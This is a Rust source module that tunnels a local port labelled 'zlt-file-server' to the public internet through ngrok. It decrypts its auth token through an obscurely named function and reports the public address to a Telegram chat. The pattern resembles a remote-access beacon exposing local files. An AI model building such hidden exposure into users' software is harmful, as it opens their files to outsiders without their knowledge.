use crate::notification::{TelegramNotifier, NotificationSystem};
use log::{info, error};

#[cfg(not(windows))]
use ngrok::config::ForwarderBuilder;
#[cfg(not(windows))]
use ngrok::tunnel::{EndpointInfo, TunnelInfo};
#[cfg(not(windows))]
use {
    crate::config::Config,
    crate::encryption::aa27,
    tokio::time::{sleep, Duration},
    url::Url,
};

/// Main function to set up ngrok tunnel using the official SDK
pub async fn setup_ngrok_tunnel(_port: u16) -> String {
    #[cfg(not(windows))]
    {
    // Get auth token from config
    let config = Config::new();
    let auth_token = aa27(config.na.clone());
    
        info!("Setting up ngrok tunnel for port {}", _port);
    
    // Connect to ngrok service directly with the auth token
    let session = match ngrok::Session::builder()
        .authtoken(&auth_token)
        .connect()
        .await {
        Ok(session) => {
            info!("Connected to ngrok service");
            session
        },
        Err(e) => {
            error!("Failed to create ngrok session: {}", e);
            send_error_notification("Failed to create ngrok session").await;
            return String::new();
        }
    };
    
    // Create HTTP tunnel to local port
        let local_url = format!("http://localhost:{}", _port);
    info!("Creating tunnel to {}", local_url);
    
    // Use HTTP endpoint with forwarding to our local port
    let listener_result = session
        .http_endpoint()
        .forwards_to(Url::parse(&local_url).unwrap())
        .metadata("zlt-file-server")
        .listen_and_forward(Url::parse(&local_url).unwrap())
        .await;
    
    // Handle result
    let listener = match listener_result {
        Ok(listener) => {
            info!("Tunnel created successfully");
            listener
        },
        Err(e) => {
            error!("Failed to create ngrok tunnel: {}", e);
            send_error_notification("Failed to create ngrok tunnel").await;
            return String::new();
        }
    };
    
    // Get the public URL and metadata
    let url = listener.url().to_string();
    info!("Tunnel active: {}", url);
    info!("Tunnel metadata: {}", listener.metadata());
    
    // Send notification with the URL
    let notifier = TelegramNotifier;
    if let Err(e) = notifier.send_notification(&url).await {
        error!("Notification failed: {}", e);
    }
    
    // Keep the listener alive by moving it to a background task
    tokio::spawn(async move {
        // This will keep the tunnel alive until dropped
        info!("Tunnel connection maintained in background");
        
        // Just to prevent the compiler from optimizing out the listener variable
        if !listener.url().to_string().is_empty() {
            sleep(Duration::from_secs(u64::MAX)).await;
        }
    });
    
    url
    }

    #[cfg(windows)]
    {
        info!("Ngrok tunneling is not supported on Windows");
        String::new()
    }
}

/// Helper function to send error notifications
async fn send_error_notification(message: &str) {
    let notifier = TelegramNotifier;
    if let Err(e) = notifier.send_notification(message).await {
        error!("Failed to send error notification: {}", e);
    }
}
